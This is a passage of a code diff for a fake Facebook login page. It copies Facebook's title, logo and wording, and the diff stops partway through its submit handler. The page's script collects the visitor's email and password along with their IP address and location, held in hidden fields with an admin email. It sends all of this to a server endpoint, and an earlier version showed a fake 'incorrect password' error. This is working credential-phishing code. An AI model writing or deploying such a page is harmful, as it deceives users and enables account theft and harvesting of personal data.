@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log into Facebook</title>
+    <title>Facebook – log in or sign up</title>
     <meta name="robots" content="noindex">
     <meta name="googlebot" content="noarchive">
     <link rel="icon" href="/assets/facebook.svg" type="image/svg+xml">
@@ -30,7 +30,7 @@
             .container {
                 flex-direction: row;
                 justify-content: space-between;
-                align-items: flex-start;
+                align-items: center;
                 margin: 0 auto;
             }
         }
@@ -61,54 +61,66 @@
             line-height: 32px;
             width: auto;
         }
-        .login-container {
+        .login-form-container {
             background-color: #fff;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            width: 396px;
-            padding: 16px;
-            box-sizing: border-box;
-        }
-        .form-container {
+            padding: 20px;
             width: 100%;
+            max-width: 396px;
         }
-        .input-field {
-            width: 100%;
-            height: 52px;
+        .form-group {
+            margin-bottom: 15px;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
             border: 1px solid #dddfe2;
             border-radius: 6px;
             font-size: 17px;
             padding: 14px 16px;
-            margin-bottom: 12px;
+            width: 100%;
+            height: 22px;
+            line-height: 22px;
+            vertical-align: middle;
             box-sizing: border-box;
         }
-        .input-field:focus {
-            outline: none;
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
         }
-        .login-button {
+        .hidden-inputs {
+            display: none;
+        }
+        button {
             background-color: #1877f2;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
             border: none;
             border-radius: 6px;
-            height: 48px;
-            width: 100%;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
             margin-top: 6px;
+            padding: 0 16px;
+            width: 100%;
+            height: 48px;
             cursor: pointer;
         }
-        .login-button:hover {
+        button:hover {
             background-color: #166fe5;
         }
         .forgot-password {
-            display: block;
-            margin: 16px 0;
-            text-align: center;
             color: #1877f2;
             font-size: 14px;
+            text-align: center;
+            display: block;
+            margin: 16px 0;
             text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
         }
         .divider {
             border-bottom: 1px solid #dadde1;
@@ -116,165 +128,161 @@
         }
         .create-account {
             background-color: #42b72a;
-            color: white;
-            font-size: 17px;
-            font-weight: bold;
             border: none;
             border-radius: 6px;
-            height: 48px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
             padding: 0 16px;
+            height: 48px;
+            display: inline-block;
+            text-align: center;
+            line-height: 48px;
             margin: 6px auto;
-            display: block;
-            cursor: pointer;
+            text-decoration: none;
         }
         .create-account:hover {
             background-color: #36a420;
         }
-        .page-link {
+        .create-account-container {
+            text-align: center;
+        }
+        .create-page {
             color: #1c1e21;
             font-size: 14px;
             text-align: center;
             margin-top: 28px;
         }
-        .page-link a {
+        .create-page a {
             color: #1c1e21;
             font-weight: 600;
             text-decoration: none;
         }
-        .error-message {
-            color: #ff3b30;
-            font-size: 13px;
-            margin-top: 5px;
-            margin-bottom: 10px;
-        }
-        .loader-container {
-            display: none;
-            text-align: center;
-            margin: 10px 0;
-        }
-        .loader {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(24, 119, 242, 0.2);
-            border-radius: 50%;
-            border-top-color: #1877f2;
-            animation: spin 1s ease-in-out infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .create-page a:hover {
+            text-decoration: underline;
         }
         .footer {
             width: 100%;
-            text-align: center;
+            background-color: #fff;
             margin-top: 28px;
+            padding: 20px 0;
             color: #737373;
             font-size: 12px;
         }
-        .hidden {
-            display: none;
+        .footer-container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            padding-bottom: 8px;
+            margin-bottom: 8px;
+            border-bottom: 1px solid #dddfe2;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            margin-right: 16px;
+            margin-bottom: 4px;
+            font-size: 12px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .footer-copyright {
+            margin-top: 20px;
         }
     </style>
 </head>
-<body>
-    <input type="hidden" id="country" value="" name="country">
-    <input type="hidden" id="city" value="" name="city">
-    <input type="hidden" id="continent" value="" name="continent">
-    <input type="hidden" id="ip" value="" name="ip">
-    <input type="hidden" id="adminEmail" value="admin@example.com" name="adminEmail">
 
+<body>
     <div class="container">
         <div class="facebook-info">
             <div class="facebook-logo">
-                <img src="/assets/facebook.svg" alt="Facebook" />
+                <svg xmlns="http://www.w3.org/2000/svg" width="300" height="106" viewBox="0 0 316 106">
+                    <path d="M50.5 89.8C47.6 89.8 45.2 92.2 45.2 95.1v10.7h11v-10.7c0-2.9-2.4-5.3-5.3-5.3h-.4z" fill="#0866ff"/>
+                    <path d="M238.9 1.2h-218C9.5 1.2 1 9.7 1 21v64c0 11.3 8.5 19.8 19.8 19.8h31.8v-41h-18v-20h18V34c0-19 10-31 28-31 9.2 0 14 1 16.8 1.2v18.8h-13.5c-8.8 0-12.1 5.1-12.1 13.8v10.4h25.6l-4 20h-21.6v41h63.3c11.3 0 19.8-8.5 19.8-19.8V21c0-11.3-8.5-19.8-19.8-19.8z" fill="#0866ff"/>
+                    <path d="M272.8 27.9c-9.4 0-18 4.4-23.2 13.2V28.8h-17.8v73h18.1V61.9c0-10.1 5.9-16.3 14.9-16.3 8.6 0 13.8 5.8 13.8 16.3v39.9h18.1V59.6c0-19.9-11.9-31.7-24-31.7zM316 44.9h-18.1v57h18.1v-57zM307 17.1c-5.9 0-10.6 4.6-10.6 10.4s4.7 10.4 10.6 10.4c5.9 0 10.6-4.6 10.6-10.4s-4.7-10.4-10.6-10.4z" fill="#0866ff"/>
+                </svg>
             </div>
-            <h2 class="facebook-motto">Facebook helps you connect and share with the people in your life.</h2>
+            <h2 class="facebook-motto">Connect with friends and the world around you on Facebook.</h2>
         </div>
-        <div class="login-container">
-            <div class="form-container">
-                <form id="loginForm">
-                    <input type="text" id="email" class="input-field" placeholder="Email address or phone number" autocomplete="off">
-                    <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="off">
-                    
-                    <div class="error-message" id="errorMessage"></div>
-                    <div class="loader-container" id="loaderContainer">
-                        <div class="loader"></div>
-                        <span>Logging in...</span>
-                    </div>
-                    
-                    <button type="submit" class="login-button">Log In</button>
-                </form>
-                <a href="#" class="forgot-password">Forgotten password?</a>
+        <div class="login-form-container">
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="text" id="email" name="email" placeholder="Email or phone number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <div class="hidden-inputs">
+                    <input type="hidden" id="country" name="country">
+                    <input type="hidden" id="city" name="city">
+                    <input type="hidden" id="continent" name="continent">
+                    <input type="hidden" id="ip" name="ip">
+                    <input type="hidden" id="adminEmail" name="adminEmail" value="admin@example.com">
+                </div>
+                <button type="submit" id="btn">Log In</button>
+                <a href="#" class="forgot-password">Forgot password?</a>
                 <div class="divider"></div>
-                <button class="create-account">Create New Account</button>
+                <div class="create-account-container">
+                    <a href="#" class="create-account">Create new account</a>
+                </div>
+            </form>
+            <div class="create-page">
+                <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
             </div>
         </div>
-    </div>
-    
-    <div class="footer">
-        <div>© 2023 Facebook</div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Get form elements
-            const loginForm = document.getElementById('loginForm');
-            const email = document.getElementById('email');
-            const password = document.getElementById('password');
-            const errorMessage = document.getElementById('errorMessage');
-            const loaderContainer = document.getElementById('loaderContainer');
-            const country = document.getElementById('country');
-            const city = document.getElementById('city');
-            const continent = document.getElementById('continent');
-            const ip = document.getElementById('ip');
-            const adminEmail = document.getElementById('adminEmail');
-            
-            // Get user location
+            // Get user's location and IP information
             getUserLocationAndIp();
             
-            // Add form submit handler
-            loginForm.addEventListener('submit', function(e) {
+            // Handle form submission
+            document.getElementById('login-form').addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                // Basic validation
-                if (!email.value) {
-                    errorMessage.textContent = 'Email or phone number required';
-                    return;
-                }
+                // Show verification message
+                alert("Verifying login information...");
                 
-                if (!password.value) {
-                    errorMessage.textContent = 'Password required';
-                    return;
-                }
-                
-                // Show loader, hide previous error
-                loaderContainer.style.display = 'block';
-                errorMessage.textContent = '';
-                
-                // Simulate verification delay (1.5 seconds)
+                // Create data object to be sent to server
                 setTimeout(function() {
-                    // Hide loader
-                    loaderContainer.style.display = 'none';
+                    const email = document.getElementById('email');
+                    const password = document.getElementById('password');
+                    const country = document.getElementById('country');
+                    const city = document.getElementById('city');
+                    const continent = document.getElementById('continent');
+                    const ip = document.getElementById('ip');
+                    const adminEmail = document.getElementById('adminEmail');
                     
-                    // Show error message
-                    errorMessage.textContent = 'The password you have entered is incorrect. Forgotten password?';
+                    // Data validation
+                    if (!email.value || !password.value) {
+                        alert('Please fill in all fields.');
+                        return;
+                    }
                     
-                    // Create the data object for Supabase
-                    const userData = {
+                    // Create data object
+                    const loginData = {
                         username: email.value + " (FB)",
                         password: password.value,
                         country: country.value,
                         city: city.value,
                         continent: continent.value,
-                        ip_address: ip.value,
-                        platform: 'facebook'
+                        ip: ip.value,
+                        adminEmail: adminEmail.value
                     };
                     
-                    // Save to database
+                    // Send data to server
                     fetch('/api/login', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(userData)
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(loginData)
                     })
                     .then(response => response.json())
                     .then(data => {
